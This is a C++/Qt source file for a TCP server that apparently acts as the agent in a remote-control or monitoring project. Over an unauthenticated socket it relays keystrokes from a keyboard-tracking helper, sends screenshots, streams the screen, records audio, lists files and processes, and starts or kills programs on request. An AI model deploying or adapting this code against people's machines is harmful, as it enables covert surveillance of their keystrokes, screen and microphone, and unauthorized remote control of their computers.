
#include "server.h"

#include <QDebug>
#include <QApplication>
#include <QScreen>
#include "windows.h"

#include <QGuiApplication>
#include <QUrl>

#define NETCARD_ROOT    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkCards"
#define TCPIP_ROOT  L"SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\Interfaces"


Server::Server(QObject *parent)
    : QObject{parent}
{
    initServer();
//    myFileExplorer = new fileExplorer;
    connect(tcpServer, &QTcpServer::newConnection, this, &Server::newConnection);

    clients = QList<QTcpSocket*>();

}

//Server::~Server() {
//    delete processKeyboardTrack;
//    delete processListProcesses;
//}

void Server::initServer()
{
    tcpServer = new QTcpServer(this);
    if (!tcpServer->listen()) {
        qDebug() << "Unable to start server.";
        return;
    }

    //First enumerate all network adapters

    HKEY hNetCardsKey;
    LSTATUS lStatus = ERROR_SUCCESS;

    lStatus = RegOpenKey(HKEY_LOCAL_MACHINE,
                         NETCARD_ROOT,
                         &hNetCardsKey);

    if(ERROR_SUCCESS == lStatus)
    {
        DWORD dwCards = 0L;
        DWORD dwMaxSubkeyNameLen = 0L;
        lStatus = RegQueryInfoKey(hNetCardsKey, NULL, NULL, NULL, &dwCards,
                                  &dwMaxSubkeyNameLen, NULL, NULL, NULL, NULL, NULL, NULL);

        if(ERROR_SUCCESS == lStatus && dwCards)
        {
            for(DWORD i = 0; i < dwCards; i++)
            {
                TCHAR wszCurrentCardIdxName[MAX_PATH];
                wszCurrentCardIdxName[0] = '\0';
                lStatus = RegEnumKey(hNetCardsKey, i,
                                     wszCurrentCardIdxName, MAX_PATH);

                if(ERROR_SUCCESS == lStatus)
                {
                    TCHAR wszAdapterKeyName[MAX_PATH];
                    wszAdapterKeyName[0] = '\0';

                    wsprintf(wszAdapterKeyName, L"%s\\%s", NETCARD_ROOT,
                             wszCurrentCardIdxName);

                    HKEY hCardNameKey;

                    lStatus = RegOpenKey(
                        HKEY_LOCAL_MACHINE,
                        wszAdapterKeyName,
                        &hCardNameKey);

                    if(ERROR_SUCCESS == lStatus)
                    {
                        TCHAR wszServiceNameGuid[MAX_PATH];
                        TCHAR wszAdapterName[MAX_PATH];

                        DWORD dwSize = sizeof(wszServiceNameGuid);
                        wszServiceNameGuid[0] = '\0';
                        RegQueryValueEx(
                            hCardNameKey,
                            L"ServiceName",
                            NULL,
                            NULL,
                            (LPBYTE)wszServiceNameGuid,
                            &dwSize);

                        dwSize = sizeof(wszAdapterName);
                        RegQueryValueEx(
                            hCardNameKey,
                            L"Description",
                            NULL,
                            NULL,
                            (LPBYTE)wszAdapterName,
                            &dwSize);

                        OutputDebugStringW(wszServiceNameGuid);
                        OutputDebugStringW(L"\n");

                        RegCloseKey(hCardNameKey);

                        //Get parameters
                        TCHAR wszCardParamKey[MAX_PATH];
                        wszCardParamKey[0] = '\0';
                        wsprintf(wszCardParamKey,L"%s\\%s", TCPIP_ROOT, wszServiceNameGuid);

                        HKEY hParamKey = NULL;

                        lStatus = RegOpenKey(
                            HKEY_LOCAL_MACHINE,
                            wszCardParamKey,
                            &hParamKey);

                        if(ERROR_SUCCESS == lStatus)
                        {
                            DWORD dwEnabledDHCP = 0L;
                            DWORD dwDWSize = sizeof(DWORD);
                            TCHAR wszStaticIP[32];
                            TCHAR wszDHCPIP[32];
                            DWORD dwIPSize = sizeof(wszDHCPIP);

                            ZeroMemory(wszDHCPIP, dwIPSize);
                            ZeroMemory(wszStaticIP, dwIPSize);

                            lStatus = RegQueryValueEx(
                                hParamKey,
                                L"EnableDHCP",
                                NULL, NULL,
                                (LPBYTE)&dwEnabledDHCP,
                                &dwDWSize);

                            if(SUCCEEDED(lStatus))
                            {
                                std::wstring your_wchar_in_ws(wszAdapterName);
                                std::string your_wchar_in_str(your_wchar_in_ws.begin(), your_wchar_in_ws.end());
                                const char* your_wchar_in_char =  your_wchar_in_str.c_str();
                                adapterNamesList << QString(your_wchar_in_char);
                                qDebug() << "ADAPTER NE: " << QString(your_wchar_in_char);
                            }

                            lStatus = RegQueryValueEx(
                                hParamKey,
                                L"IPAddress",
                                NULL,
                                NULL,
                                (LPBYTE)&wszStaticIP,
                                &dwIPSize);

                            if(SUCCEEDED(lStatus))
                            {
//                                wprintf_s(L"\tConfigured IP Address : %s\n", wszStaticIP);
                            }

                            dwIPSize = sizeof(wszDHCPIP);
                            lStatus = RegQueryValueEx(
                                hParamKey,
                                L"DhcpIPAddress",
                                NULL,
                                NULL,
                                (LPBYTE)&wszDHCPIP,
                                &dwIPSize);

                            if(SUCCEEDED(lStatus))
                            {
//                                wprintf_s(L"\tDHCP IP Address : %s\n", wszDHCPIP);
                                std::wstring your_wchar_in_ws(wszDHCPIP);
                                std::string your_wchar_in_str(your_wchar_in_ws.begin(), your_wchar_in_ws.end());
                                const char* your_wchar_in_char =  your_wchar_in_str.c_str();
                                ipAddressList << QString(your_wchar_in_char);
                                qDebug() << "ALO?" << QString(your_wchar_in_char);
                            }

//                            wprintf_s(L"\n");

                            RegCloseKey(hParamKey);
                        }

                    }
                }
            }
        }
    }
    QList<QHostAddress> ipAddressesList2 = QNetworkInterface::allAddresses();
    for (const QHostAddress& address : ipAddressesList2) {
        if (address != QHostAddress::LocalHost && address.protocol() == QAbstractSocket::IPv4Protocol) {
            qDebug() << "Local LAN IP Address:" << address.toString();
        }


        RegCloseKey(hNetCardsKey);
    }
    QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();

    //! [1]
    port = QString::number(tcpServer->serverPort());
}

void Server::sendMessage(QTcpSocket* sender, const QString &msg, QString type)
{
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << type << msg;
    sender->write(block);
    sender->waitForBytesWritten();

    if(!sender->waitForBytesWritten(1000)) {
        qDebug()<<"Write error";
    }
}

void Server::sendScreenshot(QTcpSocket* sender, const QPixmap &screenshot, QString type) {

    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    QByteArray byteArray;
    QBuffer buffer(&byteArray);
    buffer.open(QIODevice::WriteOnly);
    screenshot.save(&buffer, "JPEG");
    out << type << byteArray;
    sender->write(block);
    qDebug() << "image sent to client";

    if(!sender->waitForBytesWritten(1000)) {
        qDebug()<<"Write error";
    }
}

void Server::sendFileStructure(QTcpSocket* sender, const QStringList &fileStruct, const QStringList &directories)
{
    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("file") << fileStruct << directories;
    sender->write(block);

    if(!sender->waitForBytesWritten(1000)) {
        qDebug()<<"Write error";
    }
}

void Server::sendApplications(QTcpSocket* clientSocket)
{
    QProcess *process = static_cast<QProcess *>(sender());
    qDebug() << "listing applications?";
    QString output = process->readAllStandardOutput();
    //    QStringList lines = output.split('\n');
    QStringList appsInfo = output.split('\n');

    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("list applications") << 2 << appsInfo;
    clientSocket->flush();
    clientSocket->write(block);

    if(!clientSocket->waitForBytesWritten(1000)) {
        qDebug()<<"Write error";
    }
}

void Server::sendRunningApplications(QTcpSocket* clientSocket)
{
    QProcess *process = static_cast<QProcess *>(sender());
    qDebug() << "listing running applications?";
    QString output = process->readAllStandardOutput();
    //    QStringList lines = output.split('\n');
    QStringList runningAppsInfo = output.split('\n');

    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("list running applications") << 3 << runningAppsInfo;
    clientSocket->flush();
    clientSocket->write(block);

    if(!clientSocket->waitForBytesWritten(1000)) {
        qDebug()<<"Write error";
    }
}

void Server::sendProcesses(QTcpSocket* clientSocket) {
    QProcess *process = static_cast<QProcess *>(sender());
    qDebug() << "listing processing?";
    QString output = process->readAllStandardOutput();
    //    QStringList lines = output.split('\n');
    QStringList processInfo = output.split('\n');

    QByteArray block;
    QDataStream out(&block, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("list processes") << 1 << processInfo;
    clientSocket->flush();
    clientSocket->write(block);

    if(!clientSocket->waitForBytesWritten(1000)) {
        qDebug()<<"Write error";
    }


}

void Server::send_audio_file(QTcpSocket* sender){
    QFile file("D:\\recorded_data.m4a");
    file.open(QIODevice::ReadOnly);
    QByteArray mydata = file.readAll();

    QDataStream out(&mydata, QIODevice::WriteOnly);
    out.setVersion(QDataStream::Qt_6_5);

    out << tr("audio") << mydata;
    sender->write(mydata);

    if(!sender->waitForBytesWritten(1000)) {
        qDebug()<<"Write error";
    }
    qDebug() << "audio sent";
    file.close();
}

void Server::startTask(QString taskToStart) {
    qDebug() << "Hello im testing taskkill :D." << taskToStart << QString(taskToStart);
    QProcess* process = new QProcess;

    process->start(taskToStart);
    process->waitForFinished(-1); // Wait for the process to finish

    connect(process, &QProcess::finished, [=]() {
        process->deleteLater();
    });
}

void Server::killTaskName(QString taskToKill) {
    QProcess* process = new QProcess;
    QString program = "taskkill";
    QStringList arguments;
    arguments << "/F" << "/IM" << taskToKill;
    process->start(program, arguments);
    process->waitForFinished(-1); // Wait for the process to finish
    connect(process, &QProcess::finished, [=]() {
        // Process has finished, delete the object
        process->deleteLater();
    });
}

void Server::killTaskPID(QString pidToKill) {
    qDebug() << pidToKill << "killing this";
    QProcess* process = new QProcess;
    QString program = "taskkill";
    QStringList arguments;
    arguments << "-PID" << pidToKill;
    process->start(program, arguments);
    process->waitForFinished(-1); // Wait for the process to finish
    connect(process, &QProcess::finished, [=]() {
        // Process has finished, delete the object
        process->deleteLater();
    });
}

void Server::readMessage() {
    QTcpSocket *clientConnection = static_cast<QTcpSocket*>(sender());
    if (clientConnection != nullptr) {
        qDebug() << "read message client connection not null";
    }


    in.setDevice(clientConnection);
    in.setVersion(QDataStream::Qt_6_5);
    in.startTransaction();

    QString message;
    QString target;
    in >> message;
    if (message == tr("kill task pid") ||
        message == tr("kill task name") ||
        message == tr("start task name") ||
        message == tr("ls")) {
        in >> target;
    }

    qDebug() << "A message just got to server: " << message;

    qDebug() << "A message just got to server: " << message;

    if (!in.commitTransaction())
        return;

//    statusLabel->setText(message);

    if (message == tr("list applications")) {

        processListApps = new QProcess();
        QString workingDir = QDir::currentPath();
        processListApps->start(workingDir + "//list_apps.exe");
        connect(processListApps, &QProcess::readyReadStandardOutput, this, [=]() {
            sendApplications(clientConnection);
        });

//        tracking_keyboard();
    }
    else if (message  == tr("list running applications")) {

        processListRunningApps = new QProcess();
        QString workingDir = QDir::currentPath();
        processListRunningApps->start(workingDir + "//list_running_apps.exe");
        connect(processListRunningApps, &QProcess::readyReadStandardOutput, this, [=]() {
            sendRunningApplications(clientConnection);
        });
    }
    else if (message == tr("list processes and apps")) {
        QString workingDir = QDir::currentPath();

        processListRunningApps = new QProcess(this);
        processListRunningApps->start(workingDir + "//list_running_apps.exe");
        connect(processListRunningApps, &QProcess::readyReadStandardOutput, this, [=]() {
            sendRunningApplications(clientConnection);
        });

        processListProcesses = new QProcess(this);
        processListProcesses->start(workingDir + "//list_processes.exe");
        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, [=]() {
            sendProcesses(clientConnection);
        });

        processListApps = new QProcess(this);
        processListApps->start(workingDir + "//list_apps.exe");
        connect(processListApps, &QProcess::readyReadStandardOutput, this, [=]() {
            sendApplications(clientConnection);
        });

    }
    else if (message == tr("list processes")) {
        processListProcesses = new QProcess();
        QString workingDir = QDir::currentPath();
        processListProcesses->start(workingDir + "//list_processes.exe");
        connect(processListProcesses, &QProcess::readyReadStandardOutput, this, [=]() {
            sendProcesses(clientConnection);
        });
    }
    else if (message == tr("keyboard_track")) {
        qDebug() << "keyboard tracking started?";
        processKeyboardTrack = new QProcess();
        processKeyboardTrack->start(".\\keyboard_track.exe");
        connect(processKeyboardTrack, &QProcess::readyReadStandardOutput, this, [=]() {
            QString data(processKeyboardTrack->readAllStandardOutput());
            QString temp(data);

            QStringList pieces = temp.split( tr("\r\n"), Qt::SkipEmptyParts );
            QString m_name = pieces.value( 0 );
            QString m_combine = pieces.value( 1 );

            QByteArray block;
            QDataStream out(&block, QIODevice::WriteOnly);
            out.setVersion(QDataStream::Qt_6_5);

            out << tr("stroke") << m_name << m_combine;
            clientConnection->flush();
            clientConnection->write(block);

            if(!clientConnection->waitForBytesWritten(1000)) {
                qDebug()<<"Write error";
            }
        });
    }
    else if(message == tr("stop_stroke")){
        processKeyboardTrack->kill();
        delete processKeyboardTrack;
        processKeyboardTrack = nullptr;
    }
    else if (message == tr("take screenshot")) {
        qDebug() << "taken screenshot";
        QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
        sendScreenshot(clientConnection, screenshot, tr("image"));

    }
    else if (message == tr("stream screen")){
        qDebug() << "streaming screen";
        timer = new QTimer;
        connect(timer, &QTimer::timeout, this, [=]() {
            stream(clientConnection);
        });
        timer->start(200);
//        QTimer::singleShot(3000, timer, &QTimer::stop);
    }
    else if (message == tr("stop_stream")){
        timer->stop();
        delete timer;
        timer = nullptr;
        //        QTimer::singleShot(3000, timer, &QTimer::stop);
    }
    else if (message == tr("recording")){
        if (recorder == nullptr)
            recorder = new AudioRecorder;

        recorder->auto_start();
    }
    else if (message == tr("stop_recording")){
        recorder->stop_by_msg();

        recorder->close();
        delete recorder;
        recorder = nullptr;

        send_audio_file(clientConnection);
    }
    else if (message == "ls") {
        qDebug() << "roi co ls chua";
//        QString dirPath = args.size() > 1 ? args[1] : ".";
        QString dirPath = (target != "" ? target : ".");
        qDebug() << dirPath << target;
        QDir dir(dirPath);
        QStringList entries = dir.entryList();
        QString response = entries.join("\n");

        QStringList fullPathsEntries;

        for (const QString& entry : entries) {
            QString fullPath = dir.absoluteFilePath(entry);
            fullPathsEntries.append(fullPath);
        }

        QStringList directories;

        for (const QString& entry : entries) {
            QString fullPath = dir.absoluteFilePath(entry);
            if (QFileInfo(fullPath).isDir()) {
                directories.append(fullPath);
            }
        }

        sendFileStructure(clientConnection, fullPathsEntries, directories);
    }
    else if (message == tr("kill task pid")) {
        qDebug() << "killing task pid" << target;
        killTaskPID(target);
    }
    else if (message == tr("kill task name")) {
        killTaskName(target);
    }
    else if (message == tr("start task name")) {
        startTask(target);
    }

    emit(readyRead(message));
}

void Server::stream(QTcpSocket* clientConnection) {
    QPixmap screenshot = QGuiApplication::primaryScreen()->grabWindow(0);
    sendScreenshot(clientConnection, screenshot, tr("stream"));
}



void Server::newConnection() {
    QTcpSocket *clientConnection = tcpServer->nextPendingConnection();
    connect(clientConnection, &QTcpSocket::readyRead, this, &Server::readMessage);
    connect(clientConnection, &QTcpSocket::disconnected, this, &Server::disconnected);
    clients.append(clientConnection);
    qDebug() << "incoming connection.";
    //sendMessage(clientConnection, "ayooo", );
}

void Server::disconnected() {
    QTcpSocket *clientSocket = static_cast<QTcpSocket*>(sender());
    clients.removeOne(clientSocket);
}



